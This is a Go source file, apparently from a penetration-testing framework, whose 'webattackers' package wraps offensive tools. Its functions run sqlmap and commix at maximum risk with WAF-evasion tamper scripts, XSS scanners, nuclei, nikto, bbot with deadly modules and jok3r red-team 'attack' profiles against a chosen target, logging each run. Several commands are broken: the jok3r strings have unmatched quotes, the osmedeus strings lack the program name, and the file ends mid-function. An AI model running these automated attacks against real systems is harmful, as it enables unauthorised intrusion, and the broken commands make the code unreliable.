package webattackers

import (
    "os"
    "fmt"
    "time"
    "bufio"
    "strings"
    "bcolors"
    "subprocess"
)

var (
 userInput    string
 userPort     string
 userTarget   string
 chosenTarget string
)

func WafW00f(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/WafW00f.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Println(); fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing waf scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'wafw00f -v -a %s' -O %s`, userTarget, Logs); fmt.Println()
}

func DnsRecon(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/DnsRecon.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing dns scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'dnsrecon -a -d %s' -O %s`, userTarget, Logs); fmt.Println()
}

func SeekOlver(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/SeekOlver.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing recon scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/seekolver/; python3 seekolver.py -v -r -k -cn -p 80 443 -te %s' -O %s`, userTarget, Logs); fmt.Println()
}

func WhatWeb(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Jok3r2.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing tech scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'whatweb -a 3 -v %s' -O %s`, userTarget, Logs); fmt.Println()
}

func TheHarvester(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/TheHarvester.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing email recon on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'theHarvester -n -l 45 -b bing,yahoo,duckduckgo -r "1.1.1.1" -d %s' -O %s`, userTarget, Logs); fmt.Println()
}

func ParamSpider(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/ParamSpider.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing urls mine on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'paramspider -s -d %s' -O %s`, userTarget, Logs); fmt.Println()
}

func SslScan(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/SslScan.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing ssl scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'sslscan --show-certificate --show-sigs --tlsall --verbose %s' -O %s`, userTarget, Logs); fmt.Println()
}

func Gobuster(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Gobuster.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing dir recon on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'gobuster dir vhost --debug --no-error --random-agent -w /root/.africana/africana-base/wordlists/content/big.txt -e -u %s' -O %s`, userTarget, Logs); fmt.Println()
}

func Nuclei(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Nuclei.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing vuln scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'nuclei -u %s' -O %s`, userTarget, Logs); fmt.Println()
}

func Nikto(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Nikto.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing 2nd vuln scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'nikto -ask no -Cgidirs all -Display 3 -host %s' -O %s`, userTarget, Logs); fmt.Println()
}

func Bbot(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Bbot.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing 3rd vuln scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'bbot -y -f subdomain-enum email-enum cloud-enum web-basic -m nmap gowitness nuclei --allow-deadly -t %s' -O %s`, userTarget, Logs); fmt.Println()
}

func Uniscan(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Uniscan.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing 4th vuln scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'uniscan -qweds -u %s' -O %s`, userTarget, Logs); fmt.Println()
}

func SqlmapAuto(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/SqlmapAuto.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing sql 💉 scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -u %s' -O %s`, userTarget, Logs); fmt.Println()
}

func SqlmapMan() {
    Logs := fmt.Sprintf("/root/.africana/logs/SqlmapMan.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing man sql 💉 scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenTwo(`script -q -c 'sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -wizard' -O %s`, Logs); fmt.Println()
}

func CommixAuto(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/CommixAuto.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing command 💉 scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=5 -u %s' -O %s`, userTarget, Logs); fmt.Println()
}

func CommixMan() {
    Logs := fmt.Sprintf("/root/.africana/logs/CommixMan.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing man command 💉 scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenTwo(`script -q -c 'commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=5 --wizard' -O %s`, Logs); fmt.Println()
}

func KatanaAuto(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/KatanaAuto.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing xss 💉 scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'katana -jc -kf all -c 5 -d 3 %s | httpx-toolkit -silent -follow-redirects -random-agent -status-code -threads 5 | dalfox pipe --only-poc r --ignore-return 302,404,403 --skip-bav' -O %s`, userTarget, Logs); fmt.Println()
}

func XsserAuto(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/XsserAuto.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing 2nd xss 💉 scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'xsser -c 100 --Cl -u %s' -O %s`, userTarget, Logs); fmt.Println()
}

func XsserMan() {
    Logs := fmt.Sprintf("/root/.africana/logs/XsserMan.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing man xss 💉 scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenTwo(`script -q -c 'xsser -u --wizard' -O %s`, Logs); fmt.Println(); fmt.Println()
}

func NetTacker1(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/NetTacker1.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing recon scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -m port_scan -t 100 -i %s ' -O %s`, userTarget, Logs); fmt.Println()
}

func NetTacker2(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/NetTacker2.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing domain scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m subdomain_scan' -O %s`, userTarget, Logs); fmt.Println()
}

func NetTacker3(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/NetTacker3.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing admin finder scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m scan' -O %s`, userTarget, Logs); fmt.Println()
}

func NetTacker4(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/NetTacker4.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing info gathering on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m information_gathering -s' -O %s`, userTarget, Logs); fmt.Println()
}

func NetTacker5(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/NetTacker5.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing vuln scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m server_version_vuln' -O %s`, userTarget, Logs); fmt.Println()
}

func NetTacker6(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/NetTacker6.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing CVE scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m cve' -O %s`, userTarget, Logs); fmt.Println()
}

func NetTacker7(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/NetTacker7.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing critical scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m high_severity' -O %s`, userTarget, Logs); fmt.Println()
}

func NetTacker8(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/NetTacker8.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing intrusive scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s --profile all/results.txt' -O %s`, userTarget, Logs); fmt.Println()
}

func NetTacker9() {
    Logs := fmt.Sprintf("/root/.africana/logs/nettacker9.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Launched WebUI key: africana " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py --start-api --api-access-key africana' -O %s`, Logs); fmt.Println()
}

func Jok3r1() {
    Logs := fmt.Sprintf("/root/.africana/logs/Jok3r1.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Installing tools in the toolbox" + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`script -q -c 'cd /root/.africana/africana-base/jok3r/; /bin/bash install-all.sh' -O %s`, Logs); fmt.Println()
}

func Jok3r2() {
    Logs := fmt.Sprintf("/root/.africana/logs/Jok3r2.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Updating tools in the toolbox " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`script -q -c 'cd /root/.africana/africana-base/jok3r/; python3 jok3r.py toolbox --update-all --auto' -O %s`, Logs); fmt.Println()
}

func Jok3r3() {
    Logs := fmt.Sprintf("/root/.africana/logs/Jok3r3.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Showing tools in the toolbox " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`script -q -c 'cd /root/.africana/africana-base/jok3r/; python3 jok3r.py toolbox --show-all' -O %s`, Logs); fmt.Println()
}

func Jok3r4() {
    Logs := fmt.Sprintf("/root/.africana/logs/Jok3r4.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Showing supported products " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`script -q -c 'cd /root/.africana/africana-base/jok3r/; python3 jok3r.py info --services' -O %s`, Logs); fmt.Println()
}

func Jok3r5(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Jok3r5.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing avery fast-scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py attack -t %s --profile fast-scan --fast' -O %s`, userTarget, Logs); fmt.Println()
}

func Jok3r6(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Jok3r6.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing security checks on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast' -O %s`, userTarget, Logs); fmt.Println()
}

func Jok3r7(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Jok3r7.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing critical scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast' -O %s`, userTarget, Logs); fmt.Println()
}

func Jok3r8() {
    Logs := fmt.Sprintf("/root/.africana/logs/Jok3r8.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Showing results & scans " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`script -q -c 'cd /root/.africana/africana-base/jok3r/; xhost +; python3 jok3r.py db creds vulns mission hosts products services report quit; xhost -' -O %s`, Logs); fmt.Println()
}

func Jok3r9() {
    Logs := fmt.Sprintf("/root/.africana/logs/Jok3r9.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Cleaning results & scans " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`script -q -c 'cd /root/.africana/africana-base/jok3r/; python3 jok3r.py db "mission -d default"' -O %s`, Logs); fmt.Println()
}

func Osmedeus1() {
    Logs := fmt.Sprintf("/root/.africana/logs/Osmedeus1.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Updating Osmedeus & Runing diagnostics to checks " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`script -q -c 'osmedeus version --json; osmedeus update; osmedeus update --vuln; osmedeus update --force --clean' -O %s`, Logs); fmt.Println()
}

func Osmedeus2(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Osmedeus2.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing simple scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c 'osmedeus --nv scan -t %s' -O %s`, userTarget, Logs); fmt.Println()
}

func Osmedeus3(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Osmedeus3.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing dir & vuln scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c ' --nv scan -f vuln-and-dirb -t %s' -O %s`, userTarget, Logs); fmt.Println()
}

func Osmedeus4(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Osmedeus4.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "Full path: " + bcolors.DARKCYAN + "To your saved 🎯targets to be " + bcolors.RED + "attacked!!🚀" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🔮" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userTarget)
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing bulk scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c ' scan -f vuln-and-dirb -T %s' -O %s`, userTarget, Logs); fmt.Println()
}

func Osmedeus5(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Osmedeus5.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing cloud scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c ' health cloud; osmedeus cloud --chunk -c 5 -t %s' -O %s`, userTarget, Logs); fmt.Println()
}

func Osmedeus6(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Osmedeus6.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing secret & vuln scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c ' scan --tactic aggressive --nv -f vuln-and-dirb -t %s' -O %s`, userTarget, Logs); fmt.Println()
}

func Osmedeus7(userTarget string) {
    Logs := fmt.Sprintf("/root/.africana/logs/Osmedeus7.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Updating db before running vuln scan on " + bcolors.RED + "🎯target: " + bcolors.YELLOW + "🐾%s " + bcolors.GREEN + "(◕‿◕✿)\n" + bcolors.ENDC, userTarget)
    subprocess.PopenThree(`script -q -c ' scan --update-vuln -t %s' -O %s`, userTarget, Logs); fmt.Println()
}

func Osmedeus8() {
    Logs := fmt.Sprintf("/root/.africana/logs/Osmedeus8.Log.%s.txt", time.Now().Format("20060102.150405"))
    fmt.Printf(bcolors.BLUE  + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "Enter Port: " + bcolors.DARKCYAN + "To start your server on🌍" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "3333" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🔮" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
